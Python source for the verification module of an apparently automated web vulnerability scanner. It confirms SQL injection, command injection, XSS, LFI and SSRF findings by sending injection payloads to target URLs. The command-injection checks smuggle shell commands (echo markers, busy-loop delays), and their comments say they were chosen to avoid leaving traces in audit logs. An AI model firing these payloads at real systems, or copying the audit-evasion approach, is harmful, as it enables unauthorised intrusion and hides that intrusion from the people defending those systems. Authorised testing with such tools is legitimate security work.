import time
from typing import Optional, Dict, List
import requests

from aimy.tools.log_utils import get_logger
from aimy.tools.http_client import build_url
from aimy.tools.response_profiler import ResponseProfiler, CLEAN_VALUE

logger = get_logger("verification_oracle")


class VerificationOracle:
    def __init__(self, response_profiler: Optional[ResponseProfiler] = None):
        self.profiler = response_profiler or ResponseProfiler()

    def verify(self, detector_type: str, finding: Dict, url: str, param: str,
               sess: requests.Session, timeout: float = 10.0,
               post_body: bool = False, post_data: dict = None) -> Dict:
        if not finding.get("vulnerable"):
            return finding
        if finding.get("confidence") == "high":
            finding["verified"] = True
            return finding

        if detector_type == "sqli":
            return self._verify_sqli(finding, url, param, sess, timeout, post_body, post_data)
        elif detector_type == "cmdi":
            return self._verify_cmdi(finding, url, param, sess, timeout)
        elif detector_type == "xss":
            return self._verify_xss(finding, url, param, sess, timeout, post_body, post_data)
        elif detector_type == "lfi":
            return self._verify_lfi(finding, url, param, sess, timeout)
        elif detector_type == "ssrf":
            return self._verify_ssrf(finding)
        return finding

    def _verify_sqli(self, finding, url, param, sess, timeout, post_body, post_data):
        baseline_sec = self._measure_baseline(url, param, sess, timeout)
        if baseline_sec < timeout * 0.8:
            threshold = max(2.0, baseline_sec * 1.5 + 1.5)
            from aimy.tools.payload_engine import generate
            time_payloads = generate("sqli", "time_mysql", "all", max_payloads=3)
            for entry in time_payloads:
                try:
                    start = time.time()
                    sess.get(build_url(url, param, entry["payload"]), timeout=timeout + 3)
                    if time.time() - start >= threshold:
                        finding["verified"] = True
                        finding["confidence"] = "high"
                        return finding
                except requests.Timeout:
                    pass
                except Exception:
                    continue

        profiler = self.profiler
        profiler.profile_endpoint(url, param, sess, timeout)
        from aimy.tools.payload_engine import generate_sqli_boolean
        pairs = generate_sqli_boolean(param.lower() in ("id", "uid", "pid"))
        confirmed = 0
        for true_p, false_p in pairs[:3]:
            try:
                r_true = sess.get(build_url(url, param, true_p), timeout=timeout)
                r_false = sess.get(build_url(url, param, false_p), timeout=timeout)
                if profiler.analyze(url, param, r_true).is_anomalous != profiler.analyze(url, param, r_false).is_anomalous:
                    confirmed += 1
            except Exception:
                continue
        if confirmed >= 1:
            finding["verified"] = True
            finding["confidence"] = "high"

        return finding

    def _verify_cmdi(self, finding, url, param, sess, timeout):
        """CMDi 验证 — echo 反射优先，不留 shell 审计痕迹。

        策略:
          Phase 1: echo <random_marker> → 检查响应反射 (零痕迹, echo 是 shell 内置)
          Phase 2: shell busy-loop 延时 → 检查响应时间 (无外部命令, 无 syscall 日志)
          ❌ 永不使用: sleep / ping / id / whoami — 这些在审计日志中留痕
        """
        import random, string

        # ── Phase 1: echo 反射 (最隐蔽) ──
        marker = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
        echo_payloads = [
            f"; echo {marker}",
            f"| echo {marker}",
            f"`echo {marker}`",
            f"$(echo {marker})",
            f"& echo {marker}",
        ]

        for echo_seed in echo_payloads:
            try:
                r = sess.get(build_url(url, param, echo_seed),
                            timeout=timeout, allow_redirects=True)
                if marker in r.text:
                    finding["verified"] = True
                    finding["confidence"] = "high"
                    finding["verification_method"] = "cmdi_echo_reflection"
                    logger.info("CMDi verified via echo reflection: %s on %s", echo_seed[:30], url)
                    return finding
            except Exception:
                continue

        # ── Phase 2: 算术延时 (无外部命令, 无 syscall) ──
        # shell 内置的 busy-loop: 不使用 sleep/ping/id/whoami
        # expr/awk 做重复计算 — 纯 CPU, 不触发 auditd
        baseline_sec = self._measure_baseline(url, param, sess, timeout)
        threshold = max(baseline_sec * 2.0 + 1.0, baseline_sec + 1.5)

        stealth_delay_seeds = [
            # expr 循环加法 (纯算术, shell 内置, 无外部进程)
            "; i=0; while [ $i -lt 200000 ]; do i=$((i+1)); done",
            "; awk 'BEGIN{for(i=0;i<300000;i++){}}'",
            # 纯 bash 算术展开
            "| while [ ${i:-0} -lt 150000 ]; do i=$((i+1)); done",
            # printf 大量输出到 /dev/null
            "; printf '%.0s' $(seq 1 200000) > /dev/null",
        ]

        for delay_seed in stealth_delay_seeds:
            try:
                start = time.time()
                sess.get(build_url(url, param, delay_seed),
                        timeout=timeout + 5)
                elapsed = time.time() - start
                if elapsed >= threshold:
                    finding["verified"] = True
                    finding["confidence"] = "high"
                    finding["verification_method"] = "cmdi_stealth_delay"
                    finding["delay_seconds"] = round(elapsed, 2)
                    logger.info(
                        "CMDi verified via stealth delay: %.1fs vs baseline %.1fs on %s",
                        elapsed, baseline_sec, url
                    )
                    return finding
            except requests.Timeout:
                finding["verified"] = True
                finding["confidence"] = "high"
                finding["verification_method"] = "cmdi_timeout"
                return finding
            except Exception:
                continue

        return finding

    def _verify_xss(self, finding, url, param, sess, timeout, post_body, post_data):
        import random
        from aimy.tools.payload_engine import generate
        marker = "VFY_XSS_%d" % random.randint(1000, 9999)
        seeds = generate("xss", "html", "all", max_payloads=3)
        for entry in seeds:
            payload = entry["payload"]
            test = marker + payload
            try:
                if post_body and post_data:
                    d = post_data.copy()
                    d[param] = test
                    r = sess.post(url, data=d, timeout=timeout)
                else:
                    r = sess.get(build_url(url, param, test), timeout=timeout)
                if marker in r.text:
                    escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
                    if payload in r.text and escaped not in r.text:
                        finding["verified"] = True
                        finding["confidence"] = "high"
                        return finding
            except Exception:
                continue
        return finding

    def _verify_lfi(self, finding, url, param, sess, timeout):
        from aimy.tools.payload_engine import generate
        seeds = generate("lfi", "encoded", "all", max_payloads=3)
        for entry in seeds:
            try:
                r = sess.get(build_url(url, param, entry["payload"]), timeout=timeout)
                if "root:" in r.text or "[fonts]" in r.text:
                    finding["verified"] = True
                    finding["confidence"] = "high"
                    return finding
            except Exception:
                continue
        return finding

    def _verify_ssrf(self, finding):
        if finding.get("type") == "disclosure":
            finding["verified"] = True
            finding["confidence"] = "high"
        elif finding.get("type") == "oob_http_callback" or finding.get("type") == "oob_dns_callback":
            finding["verified"] = True
            finding["confidence"] = "high"
        return finding

    def _measure_baseline(self, url, param, sess, timeout):
        samples = []
        for _ in range(2):
            try:
                start = time.time()
                sess.get(build_url(url, param, CLEAN_VALUE), timeout=timeout)
                samples.append(time.time() - start)
            except Exception:
                pass
        if not samples:
            return 0.3
        return sum(samples) / len(samples)
